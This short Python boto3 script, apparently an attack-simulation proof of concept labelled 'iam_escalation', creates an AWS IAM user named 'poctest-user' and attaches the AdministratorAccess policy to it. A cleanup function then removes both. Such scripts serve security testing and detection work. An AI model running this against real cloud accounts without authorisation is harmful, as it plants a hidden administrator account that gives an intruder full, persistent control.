#!/usr/bin/Python3
#Author: Siddartha Malladi
#Twitter: st0ic3r
import boto3
import time

def run(profile=None, region=None):
    session_args = {}
    if profile:
        session_args['profile_name'] = profile
    if region:
        session_args['region_name'] = region
    session = boto3.Session(**session_args)
    iam = session.client('iam')

    user_name = 'poctest-user'
    iam.create_user(UserName=user_name)

    policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'
    iam.attach_user_policy(UserName=user_name, PolicyArn=policy_arn)

    print(f"Attached Admin policy to {user_name}")

    return {
        'scenario': 'iam_escalation',
        'user': user_name,
        'policy': policy_arn
    }

def cleanup(profile=None, region=None, user_name='poctest-user', policy_arn='arn:aws:iam::aws:policy/AdministratorAccess'):
    session_args = {}
    if profile:
        session_args['profile_name'] = profile
    if region:
        session_args['region_name'] = region
    session = boto3.Session(**session_args)
    iam = session.client('iam')

    iam.detach_user_policy(UserName=user_name, PolicyArn=policy_arn)
    iam.delete_user(UserName=user_name)
    print(f"Cleaned up {user_name} and detached policy.")
